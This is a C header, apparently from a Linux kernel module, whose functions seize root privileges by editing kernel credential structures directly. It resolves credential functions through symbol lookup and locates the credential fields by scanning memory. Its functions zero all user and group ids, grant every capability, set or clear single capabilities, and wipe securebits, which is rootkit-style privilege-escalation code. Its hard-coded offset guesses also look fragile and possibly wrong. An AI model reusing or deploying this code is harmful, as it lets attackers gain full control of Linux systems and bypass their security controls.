/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_CRED_H
#define NVK_CRED_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <nvk_mem.h>
#include <nvk_process.h>

typedef void *(*nvk_get_cred_fn)(const void *);
typedef void  (*nvk_put_cred_fn)(const void *);

static nvk_get_cred_fn      _nvk_cred_get;
static nvk_put_cred_fn      _nvk_cred_put;
static int                  _nvk_cred_inited;

static unsigned long _nvk_off_cred;
static unsigned long _nvk_off_uid;

struct nvk_cred_ids {
	u32 uid, gid, suid, sgid, euid, egid, fsuid, fsgid;
};

static int nvk_cred_init(void)
{
	if (_nvk_cred_inited) return 0;

	if (!_nvk_proc_inited)
		nvk_process_init();

	_nvk_cred_get =
		(nvk_get_cred_fn)NVK_LOOKUP("get_cred");
	_nvk_cred_put =
		(nvk_put_cred_fn)NVK_LOOKUP("put_cred");

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;

	_nvk_cred_inited = 1;
	return 0;
}

static int _nvk_cred_find_uid_offset(void)
{
	if (_nvk_off_uid) return 0;

	void *cred = _nvk_prepare_creds();
	if (!cred) return -1;

	const unsigned char *p = (const unsigned char *)cred;

	for (unsigned long i = 0; i + 24 < 128; i += 4) {
		u32 uid  = *(u32 *)(p + i);
		u32 gid  = *(u32 *)(p + i + 4);
		u32 suid = *(u32 *)(p + i + 8);
		u32 sgid = *(u32 *)(p + i + 12);
		u32 euid = *(u32 *)(p + i + 16);
		u32 egid = *(u32 *)(p + i + 20);

		if (uid == suid && suid == euid &&
		    gid == sgid && sgid == egid &&
		    uid < 65536 && gid < 65536) {
			_nvk_off_uid = i;
			break;
		}
	}

	_nvk_commit_creds(cred);

	if (!_nvk_off_uid)
		_nvk_off_uid = 4;
	return 0;
}

static int nvk_cred_get_ids(struct task_struct *task,
			    struct nvk_cred_ids *ids)
{
	const void *cred;
	const unsigned char *p;

	if (!task || !ids) return -1;

	if (!_nvk_off_cred) {
		const unsigned char *tp = (const unsigned char *)task;
		unsigned long i;
		for (i = 0x500; i < 0x800; i += 8) {
			unsigned long v = *(unsigned long *)(tp + i);
			if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
				const u32 *cp = (const u32 *)v;
				int match = 1;
				for (int j = 1; j < 8; j++) {
					if (cp[j] > 65535) { match = 0; break; }
				}
				if (match) {
					_nvk_off_cred = i;
					break;
				}
			}
		}
	}

	if (!_nvk_off_cred) return -1;

	cred = *(const void **)((unsigned long)task + _nvk_off_cred);
	if (!cred) return -1;

	p = (const unsigned char *)cred;
	unsigned long base = _nvk_off_uid ? _nvk_off_uid : 4;

	ids->uid  = *(u32 *)(p + base);
	ids->gid  = *(u32 *)(p + base + 4);
	ids->suid = *(u32 *)(p + base + 8);
	ids->sgid = *(u32 *)(p + base + 12);
	ids->euid = *(u32 *)(p + base + 16);
	ids->egid = *(u32 *)(p + base + 20);
	ids->fsuid = *(u32 *)(p + base + 24);
	ids->fsgid = *(u32 *)(p + base + 28);
	return 0;
}

static int nvk_cred_set_root(void)
{
	void *cred;

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;

	cred = _nvk_prepare_creds();
	if (!cred) return -1;

	_nvk_cred_find_uid_offset();

	unsigned char *p = (unsigned char *)cred;
	unsigned long base = _nvk_off_uid ? _nvk_off_uid : 4;

	for (int i = 0; i < 8; i++)
		*(u32 *)(p + base + i * 4) = 0;

	unsigned long cap_off = base + 32;
	for (int i = 0; i < 4; i++)
		*(u32 *)(p + cap_off + i * 4) = 0xFFFFFFFFU;

	return _nvk_commit_creds(cred);
}

static int nvk_cred_set_uid(u32 uid, u32 gid)
{
	void *cred;

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;

	cred = _nvk_prepare_creds();
	if (!cred) return -1;

	_nvk_cred_find_uid_offset();

	unsigned char *p = (unsigned char *)cred;
	unsigned long base = _nvk_off_uid ? _nvk_off_uid : 4;

	*(u32 *)(p + base + 0)  = uid;   /* uid */
	*(u32 *)(p + base + 4)  = gid;   /* gid */
	*(u32 *)(p + base + 8)  = uid;   /* suid */
	*(u32 *)(p + base + 12) = gid;   /* sgid */
	*(u32 *)(p + base + 16) = uid;   /* euid */
	*(u32 *)(p + base + 20) = gid;   /* egid */
	*(u32 *)(p + base + 24) = uid;   /* fsuid */
	*(u32 *)(p + base + 28) = gid;   /* fsgid */

	return _nvk_commit_creds(cred);
}

static int nvk_cred_set_caps_full(void)
{
	void *cred;

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;

	cred = _nvk_prepare_creds();
	if (!cred) return -1;

	_nvk_cred_find_uid_offset();

	unsigned char *p = (unsigned char *)cred;
	unsigned long cap_off = (_nvk_off_uid ? _nvk_off_uid : 4) + 32;

	for (int i = 0; i < 4; i++)
		*(u32 *)(p + cap_off + i * 4) = 0xFFFFFFFFU;

	return _nvk_commit_creds(cred);
}

#define NVK_CAP_CHOWN            0
#define NVK_CAP_DAC_OVERRIDE     1
#define NVK_CAP_DAC_READ_SEARCH  2
#define NVK_CAP_FOWNER           3
#define NVK_CAP_FSETID           4
#define NVK_CAP_KILL             5
#define NVK_CAP_SETGID           6
#define NVK_CAP_SETUID           7
#define NVK_CAP_SETPCAP          8
#define NVK_CAP_NET_BIND_SERVICE 10
#define NVK_CAP_NET_BROADCAST    11
#define NVK_CAP_NET_ADMIN        12
#define NVK_CAP_NET_RAW          13
#define NVK_CAP_SYS_MODULE       16
#define NVK_CAP_SYS_RAWIO        17
#define NVK_CAP_SYS_PTRACE       19
#define NVK_CAP_SYS_ADMIN        21
#define NVK_CAP_SYS_RESOURCE     24
#define NVK_CAP_SYS_TIME         25
#define NVK_CAP_AUDIT_CONTROL    30
#define NVK_CAP_AUDIT_READ       37
#define NVK_CAP_SYSLOG           34
#define NVK_CAP_CHECKPOINT_RESTORE 40

#define NVK_CAP_SET_EFFECTIVE   0
#define NVK_CAP_SET_PERMITTED   1
#define NVK_CAP_SET_INHERITABLE 2
#define NVK_CAP_SET_BOUNDING    3

static int nvk_cred_set_cap(int cap, int set_type)
{
	void *cred;

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;
	if (cap < 0 || cap > 63 || set_type < 0 || set_type > 3)
		return -1;

	cred = _nvk_prepare_creds();
	if (!cred) return -1;

	_nvk_cred_find_uid_offset();

	unsigned char *p = (unsigned char *)cred;
	unsigned long cap_base = (_nvk_off_uid ? _nvk_off_uid : 4) + 32;
	unsigned long set_off = cap_base + set_type * 8;

	int word = cap / 32;
	int bit = cap % 32;
	u32 *cap_word = (u32 *)(p + set_off + word * 4);
	*cap_word |= (1U << bit);

	return _nvk_commit_creds(cred);
}

static int nvk_cred_clear_cap(int cap, int set_type)
{
	void *cred;

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;
	if (cap < 0 || cap > 63 || set_type < 0 || set_type > 3)
		return -1;

	cred = _nvk_prepare_creds();
	if (!cred) return -1;

	_nvk_cred_find_uid_offset();

	unsigned char *p = (unsigned char *)cred;
	unsigned long cap_base = (_nvk_off_uid ? _nvk_off_uid : 4) + 32;
	unsigned long set_off = cap_base + set_type * 8;

	int word = cap / 32;
	int bit = cap % 32;
	u32 *cap_word = (u32 *)(p + set_off + word * 4);
	*cap_word &= ~(1U << bit);

	return _nvk_commit_creds(cred);
}

static int nvk_cred_has_cap(struct task_struct *task, int cap, int set_type)
{
	const void *cred;
	const unsigned char *p;

	if (!task || cap < 0 || cap > 63 || set_type < 0 || set_type > 3)
		return -1;

	if (!_nvk_off_cred) return -1;

	cred = *(const void **)((unsigned long)task + _nvk_off_cred);
	if (!cred) return -1;

	p = (const unsigned char *)cred;
	unsigned long cap_base = (_nvk_off_uid ? _nvk_off_uid : 4) + 32;
	unsigned long set_off = cap_base + set_type * 8;

	int word = cap / 32;
	int bit = cap % 32;
	u32 cap_val = *(u32 *)(p + set_off + word * 4);
	return (cap_val >> bit) & 1;
}

static int nvk_cred_clear_securebits(void)
{
	void *cred;

	if (!_nvk_prepare_creds || !_nvk_commit_creds)
		return -1;

	cred = _nvk_prepare_creds();
	if (!cred) return -1;

	_nvk_cred_find_uid_offset();

	unsigned char *p = (unsigned char *)cred;
	unsigned long sb_off = (_nvk_off_uid ? _nvk_off_uid : 4) + 32 + 32;
	*(u32 *)(p + sb_off) = 0;

	return _nvk_commit_creds(cred);
}

#endif /* NVK_CRED_H */
